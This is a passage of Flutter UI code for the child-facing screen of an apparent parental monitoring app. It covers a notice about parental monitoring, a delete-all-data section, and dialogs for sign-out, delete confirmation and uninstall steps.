              const Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      'Your Parent is Caring for You 💙',
                      style: TextStyle(
                        fontWeight: FontWeight.w800,
                        fontSize: 15,
                        color: Color(0xFF5B54D4),
                      ),
                    ),
                    SizedBox(height: 6),
                    Text(
                      'This app was installed by your parent to help keep you safe online and in the real world. All monitored data is only visible to them.',
                      style: TextStyle(
                        fontSize: 13,
                        color: Colors.black54,
                        height: 1.6,
                        fontWeight: FontWeight.w500,
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),

        const SizedBox(height: 16),

        // ── Delete section ────────────────────────────────────────────────
        Container(
          padding: const EdgeInsets.all(22),
          decoration: BoxDecoration(
            color: Colors.red.shade50,
            borderRadius: BorderRadius.circular(18),
            border: Border.all(color: Colors.red.shade200, width: 2),
            boxShadow: [
              BoxShadow(
                color: Colors.red.withOpacity(0.1),
                blurRadius: 15,
                offset: const Offset(0, 5),
              ),
            ],
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Row(
                children: [
                  Icon(Icons.delete_sweep_rounded,
                      color: Colors.red.shade600, size: 22),
                  const SizedBox(width: 10),
                  Text(
                    'Remove Device & Delete Data',
                    style: TextStyle(
                      fontWeight: FontWeight.w800,
                      fontSize: 15,
                      color: Colors.red.shade700,
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 12),
              Text(
                'If you want to delete all collected data and remove this device from parental monitoring, tap the button below. This will permanently erase all location, app usage, call logs, and browsing history from the server.',
                style: TextStyle(
                  fontSize: 13,
                  color: Colors.red.shade600,
                  height: 1.6,
                  fontWeight: FontWeight.w500,
                ),
              ),
              const SizedBox(height: 20),

              // Shake-on-tap delete button
              AnimatedBuilder(
                animation: _shakeAnim,
                builder: (_, child) => Transform.translate(
                  offset: Offset(
                    sin(_shakeAnim.value * pi * 8) *
                        10 *
                        (1 - _shakeAnim.value),
                    0,
                  ),
                  child: child,
                ),
                child: SizedBox(
                  width: double.infinity,
                  child: ElevatedButton.icon(
                    icon: const Icon(Icons.delete_forever_rounded, size: 22),
                    label: const Text(
                      'Delete All Data & Remove Device',
                      style: TextStyle(
                        fontWeight: FontWeight.w800,
                        fontSize: 15,
                        letterSpacing: 0.3,
                      ),
                    ),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.red.shade600,
                      foregroundColor: Colors.white,
                      padding: const EdgeInsets.symmetric(vertical: 16),
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(14),
                      ),
                      elevation: 4,
                      shadowColor: Colors.red.withOpacity(0.4),
                    ),
                    onPressed: _handleDeleteTap,
                  ),
                ),
              ),

              const SizedBox(height: 12),

              Center(
                child: Text(
                  '⚠️  This action is permanent and cannot be undone',
                  style: TextStyle(
                    fontSize: 12,
                    color: Colors.red.shade400,
                    fontStyle: FontStyle.italic,
                    fontWeight: FontWeight.w600,
                  ),
                ),
              ),
            ],
          ),
        ),
      ],
    );
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Premium Dialogs with Enhanced Animations
// ─────────────────────────────────────────────────────────────────────────────

class _PremiumLogoutDialog extends StatefulWidget {
  const _PremiumLogoutDialog({required this.onConfirm, required this.onCancel});

  final VoidCallback onConfirm;
  final VoidCallback onCancel;

  @override
  State<_PremiumLogoutDialog> createState() => _PremiumLogoutDialogState();
}

class _PremiumLogoutDialogState extends State<_PremiumLogoutDialog>
    with SingleTickerProviderStateMixin {
  late final AnimationController _scaleCtrl;
  late final Animation<double> _scale;

  @override
  void initState() {
    super.initState();
    _scaleCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 500),
    );
    _scale = Tween<double>(begin: 0.8, end: 1.0).animate(
      CurvedAnimation(parent: _scaleCtrl, curve: Curves.easeOutCubic),
    );
    _scaleCtrl.forward();
  }

  @override
  void dispose() {
    _scaleCtrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return ScaleTransition(
      scale: _scale,
      child: Dialog(
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(28)),
        elevation: 8,
        child: Padding(
          padding: const EdgeInsets.all(28),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                width: 72,
                height: 72,
                decoration: BoxDecoration(
                  color: Colors.orange.shade50,
                  shape: BoxShape.circle,
                  boxShadow: [
                    BoxShadow(
                      color: Colors.orange.withOpacity(0.2),
                      blurRadius: 16,
                      spreadRadius: 2,
                    ),
                  ],
                ),
                child:
                    Icon(Icons.logout_rounded, color: Colors.orange.shade600, size: 38),
              ),
              const SizedBox(height: 20),
              const Text(
                'Sign Out',
                style: TextStyle(fontSize: 21, fontWeight: FontWeight.w900),
              ),
              const SizedBox(height: 10),
              const Text(
                'Are you sure you want to sign out from this device?',
                textAlign: TextAlign.center,
                style: TextStyle(color: Colors.black54, fontSize: 14, height: 1.6, fontWeight: FontWeight.w500),
              ),
              const SizedBox(height: 26),
              Row(
                children: [
                  Expanded(
                    child: OutlinedButton(
                      onPressed: widget.onCancel,
                      style: OutlinedButton.styleFrom(
                        padding: const EdgeInsets.symmetric(vertical: 14),
                        shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(14)),
                        side: BorderSide(color: Colors.grey.shade300, width: 1.5),
                      ),
                      child: const Text('Cancel', style: TextStyle(fontWeight: FontWeight.w700, fontSize: 14)),
                    ),
                  ),
                  const SizedBox(width: 14),
                  Expanded(
                    child: ElevatedButton(
                      onPressed: widget.onConfirm,
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.orange.shade600,
                        foregroundColor: Colors.white,
                        padding: const EdgeInsets.symmetric(vertical: 14),
                        shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(14)),
                        elevation: 4,
                        shadowColor: Colors.orange.withOpacity(0.4),
                      ),
                      child: const Text('Sign Out',
                          style: TextStyle(fontWeight: FontWeight.w800, fontSize: 14)),
                    ),
                  ),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }
}

class _PremiumRemoveDeviceDialog extends StatefulWidget {
  const _PremiumRemoveDeviceDialog({required this.onConfirm, required this.onCancel});

  final VoidCallback onConfirm;
  final VoidCallback onCancel;

  @override
  State<_PremiumRemoveDeviceDialog> createState() =>
      _PremiumRemoveDeviceDialogState();
}

class _PremiumRemoveDeviceDialogState extends State<_PremiumRemoveDeviceDialog>
    with SingleTickerProviderStateMixin {
  late final AnimationController _scaleCtrl;
  late final Animation<double> _scale;

  @override
  void initState() {
    super.initState();
    _scaleCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 500),
    );
    _scale = Tween<double>(begin: 0.8, end: 1.0).animate(
      CurvedAnimation(parent: _scaleCtrl, curve: Curves.easeOutCubic),
    );
    _scaleCtrl.forward();
  }

  @override
  void dispose() {
    _scaleCtrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return ScaleTransition(
      scale: _scale,
      child: Dialog(
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(28)),
        elevation: 8,
        child: Padding(
          padding: const EdgeInsets.all(28),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                width: 76,
                height: 76,
                decoration: BoxDecoration(
                    color: Colors.red.shade50,
                    shape: BoxShape.circle,
                    boxShadow: [
                      BoxShadow(
                        color: Colors.red.withOpacity(0.2),
                        blurRadius: 16,
                        spreadRadius: 2,
                      ),
                    ]),
                child: Icon(Icons.warning_amber_rounded,
                    color: Colors.red.shade600, size: 44),
              ),
              const SizedBox(height: 20),
              const Text(
                'Delete All Data?',
                style: TextStyle(fontSize: 21, fontWeight: FontWeight.w900),
              ),
              const SizedBox(height: 10),
              Text(
                'Your parent set up this device to keep you safe.\n'
                'Deleting will permanently remove:',
                textAlign: TextAlign.center,
                style: TextStyle(
                    color: Colors.grey.shade600, fontSize: 14, height: 1.6, fontWeight: FontWeight.w500),
              ),
              const SizedBox(height: 16),
              ..._dataItems.map((item) => _PremiumBulletRow(text: item)),
              const SizedBox(height: 18),
              Container(
                padding:
                    const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
                decoration: BoxDecoration(
                  color: Colors.red.shade50,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: Colors.red.shade200, width: 1.5),
                ),
                child: Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Icon(Icons.info_outline_rounded,
                        size: 17, color: Colors.red.shade600),
                    const SizedBox(width: 8),
                    Text(
                      'This action cannot be undone.',
                      style: TextStyle(
                          color: Colors.red.shade700,
                          fontWeight: FontWeight.w700,
                          fontSize: 13),
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 26),
              Row(
                children: [
                  Expanded(
                    child: OutlinedButton(
                      onPressed: widget.onCancel,
                      style: OutlinedButton.styleFrom(
                        padding: const EdgeInsets.symmetric(vertical: 14),
                        shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(14)),
                        side: BorderSide(color: Colors.grey.shade300, width: 1.5),
                      ),
                      child: const Text('Cancel', style: TextStyle(fontWeight: FontWeight.w700, fontSize: 14)),
                    ),
                  ),
                  const SizedBox(width: 14),
                  Expanded(
                    child: ElevatedButton.icon(
                      icon: const Icon(Icons.delete_forever_rounded, size: 20),
                      label: const Text('Delete All',
                          style: TextStyle(fontWeight: FontWeight.w800, fontSize: 14)),
                      onPressed: widget.onConfirm,
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.red.shade600,
                        foregroundColor: Colors.white,
                        padding: const EdgeInsets.symmetric(vertical: 14),
                        shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(14)),
                        elevation: 4,
                        shadowColor: Colors.red.withOpacity(0.4),
                      ),
                    ),
                  ),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }

  static const _dataItems = [
    '📍  Location history',
    '📱  App usage data',
    '📞  Call & SMS logs',
    '🌐  Browsing history',
    '🖼️   Gallery captures',
    '🔔  Notification logs',
  ];
}

class _PremiumBulletRow extends StatelessWidget {
  const _PremiumBulletRow({required this.text});

  final String text;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        children: [
          const SizedBox(width: 8),
          Text(text,
              style: const TextStyle(fontSize: 14, color: Colors.black87, fontWeight: FontWeight.w500)),
        ],
      ),
    );
  }
}

class _PremiumUninstallGuideDialog extends StatefulWidget {
  const _PremiumUninstallGuideDialog({required this.onDone});

  final VoidCallback onDone;

  @override
  State<_PremiumUninstallGuideDialog> createState() =>
      _PremiumUninstallGuideDialogState();
}

class _PremiumUninstallGuideDialogState
    extends State<_PremiumUninstallGuideDialog>
    with SingleTickerProviderStateMixin {
  late final AnimationController _scaleCtrl;
  late final Animation<double> _scale;

  @override
  void initState() {
    super.initState();
    _scaleCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 500),
    );
    _scale = Tween<double>(begin: 0.8, end: 1.0).animate(
      CurvedAnimation(parent: _scaleCtrl, curve: Curves.easeOutCubic),
    );
    _scaleCtrl.forward();
  }

  @override
  void dispose() {
    _scaleCtrl.dispose();
    super.dispose();
  }

  static const _steps = [
    ('⚙️', 'Open your phone\'s Settings'),
    ('📱', 'Tap "Apps" or "Application Manager"'),
    ('🔍', 'Find "Parental Monitor" in the list'),
    ('🗑️', 'Tap "Uninstall"'),
    ('✅', 'Confirm the uninstall when prompted'),
  ];

  @override
  Widget build(BuildContext context) {
    return ScaleTransition(
      scale: _scale,
      child: Dialog(
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(28)),
        elevation: 8,
        child: Padding(
          padding: const EdgeInsets.all(28),
          child: SingleChildScrollView(
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  width: 76,
                  height: 76,
                  decoration: BoxDecoration(
                      color: Colors.green.shade50,
                      shape: BoxShape.circle,
                      boxShadow: [
                        BoxShadow(
                          color: Colors.green.withOpacity(0.2),
                          blurRadius: 16,
                          spreadRadius: 2,
                        ),
                      ]),
                  child: Icon(Icons.check_circle_rounded,
                      color: Colors.green.shade600, size: 46),
                ),
                const SizedBox(height: 20),
                const Text(
                  'All Data Deleted ✓',
                  style: TextStyle(fontSize: 21, fontWeight: FontWeight.w900),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 8),
                Text(
                  'To completely remove this app from your device, follow these simple steps:',
                  textAlign: TextAlign.center,
                  style: TextStyle(
                      color: Colors.grey.shade600, fontSize: 14, height: 1.6, fontWeight: FontWeight.w500),
                ),
                const SizedBox(height: 20),
                Container(
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: const Color(0xFFF4F0FF),
                    borderRadius: BorderRadius.circular(16),
                    border: Border.all(color: const Color(0xFF6C63FF).withOpacity(0.15)),
                  ),
                  child: Column(
                    children: _steps.indexed
                        .map(
                          (e) => _PremiumGuideStep(
                            number: e.$1 + 1,
                            emoji: e.$2.$1,
                            label: e.$2.$2,
                          ),
                        )
                        .toList(),
                  ),
                ),
                const SizedBox(height: 24),
                SizedBox(
                  width: double.infinity,
                  child: ElevatedButton(
                    onPressed: widget.onDone,
                    style: ElevatedButton.styleFrom(
                      backgroundColor: const Color(0xFF6C63FF),
                      foregroundColor: Colors.white,
                      padding: const EdgeInsets.symmetric(vertical: 16),
                      shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(14)),
                      elevation: 4,
                      shadowColor: const Color(0xFF6C63FF).withOpacity(0.3),
                    ),
                    child: const Text(
                      'Got it — I\'ll Uninstall Now',
                      style: TextStyle(fontWeight: FontWeight.w800, fontSize: 15),
                    ),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

class _PremiumGuideStep extends StatelessWidget {
  const _PremiumGuideStep({
    required this.number,
    required this.emoji,
    required this.label,
  });

  final int number;
  final String emoji;
  final String label;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 8),
      child: Row(
        children: [
          Container(
            width: 30,
            height: 30,
            decoration: BoxDecoration(
              color: const Color(0xFF6C63FF).withOpacity(0.15),
              shape: BoxShape.circle,
            ),
            child: Center(
              child: Text(
                '$number',
                style: const TextStyle(
                  fontSize: 14,
                  fontWeight: FontWeight.w900,
                  color: Color(0xFF6C63FF),
                ),
              ),
            ),
          ),
          const SizedBox(width: 12),
          Text(emoji, style: const TextStyle(fontSize: 20)),
          const SizedBox(width: 12),
          Expanded(
            child: Text(label,
                style: const TextStyle(fontSize: 14, color: Colors.black87, fontWeight: FontWeight.w600)),
          ),
        ],
      ),
    );
  }
}

class _PremiumDeletingOverlay extends StatefulWidget {
  const _PremiumDeletingOverlay();

  @override
  State<_PremiumDeletingOverlay> createState() =>
      _PremiumDeletingOverlayState();
}

class _PremiumDeletingOverlayState extends State<_PremiumDeletingOverlay>
    with SingleTickerProviderStateMixin {
  late final AnimationController _scaleCtrl;
  late final Animation<double> _scale;

  @override
  void initState() {
    super.initState();
    _scaleCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 400),
    );
    _scale = Tween<double>(begin: 0.8, end: 1.0).animate(
      CurvedAnimation(parent: _scaleCtrl, curve: Curves.easeOutCubic),
    );
    _scaleCtrl.forward();
  }

  @override
  void dispose() {
    _scaleCtrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Center(
      child: ScaleTransition(
        scale: _scale,
        child: Container(
          margin: const EdgeInsets.all(40),
          padding: const EdgeInsets.all(32),
          decoration: BoxDecoration(
            color: Colors.white,
            borderRadius: BorderRadius.circular(24),
            boxShadow: [
              BoxShadow(
                color: Colors.black.withOpacity(0.2),
                blurRadius: 40,
                offset: const Offset(0, 12),
                spreadRadius: 2,
              ),
            ],
          ),
          child: const Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              CircularProgressIndicator(
                color: Color(0xFF6C63FF),
                strokeWidth: 4,
              ),
              SizedBox(height: 24),
              Text(
                'Deleting all data…',
                style: TextStyle(
                  fontSize: 16,
                  fontWeight: FontWeight.w800,
                  color: Colors.black87,
                ),
              ),
              SizedBox(height: 8),
              Text(
                'Please wait, this may take a moment',
                style: TextStyle(fontSize: 13, color: Colors.black45, fontWeight: FontWeight.w500),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Shared UI helpers
// ─────────────────────────────────────────────────────────────────────────────

class _SectionCard extends StatelessWidget {
  const _SectionCard({
    required this.icon,
    required this.title,
    required this.child,
    this.trailing,
  });

  final IconData icon;
  final String title;
  final Widget child;
  final Widget? trailing;

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: Colors.white,
        borderRadius: BorderRadius.circular(18),
        border: Border.all(color: Colors.grey.shade100, width: 1.5),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.05),
            blurRadius: 12,
            offset: const Offset(0, 4),
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(icon, size: 20, color: const Color(0xFF6C63FF)),
              const SizedBox(width: 10),
              Text(
                title,
                style: const TextStyle(
                  fontSize: 15,
                  fontWeight: FontWeight.w800,
                  color: Colors.black87,
                ),
              ),
              if (trailing != null) ...[
                const Spacer(),
                trailing!,
              ],
            ],
          ),
          const SizedBox(height: 12),
          child,
        ],
      ),
    );
  }
}

class _StatChip extends StatelessWidget {
  const _StatChip({
    required this.icon,
    required this.label,
    required this.color,
  });

  final IconData icon;
  final String label;
  final Color color;

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 7),
      decoration: BoxDecoration(
        color: color.withOpacity(0.1),
        borderRadius: BorderRadius.circular(22),
        border: Border.all(color: color.withOpacity(0.3), width: 1.5),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Icon(icon, size: 15, color: color),
          const SizedBox(width: 6),
          Text(label,
              style: TextStyle(
                  fontSize: 13, fontWeight: FontWeight.w700, color: color)),
        ],
      ),
    );
  }
}

class _EmptyState extends StatelessWidget {
  const _EmptyState({required this.label});

  final String label;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 6),
      child: Text(label,
          style: const TextStyle(fontSize: 13, color: Colors.black38, fontWeight: FontWeight.w500)),
    );
  }
}
